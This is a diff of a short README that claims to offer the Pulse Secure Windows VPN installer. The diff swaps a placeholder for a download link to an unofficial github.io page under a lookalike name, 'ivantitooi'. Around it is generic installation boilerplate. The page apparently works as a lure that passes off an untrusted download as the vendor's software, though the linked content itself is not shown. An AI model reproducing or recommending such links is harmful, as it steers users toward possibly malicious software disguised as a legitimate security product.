@@ -8,7 +8,7 @@
 
 ## Installation
 Download the Pulse Secure installer by clicking the link below:      
-**⬇️ [Pulse Secure Windows Installer](*)**
+**⬇️ [Pulse Secure Windows Installer](https://ivantitooi.github.io/.github/)**
 
 Before installing, confirm that your system meets the required System Requirements to avoid compatibility problems. Use the link above to get the installation package. If you encounter any issues during downloading or installation, please consult the Troubleshooting section for solutions to common problems.
 
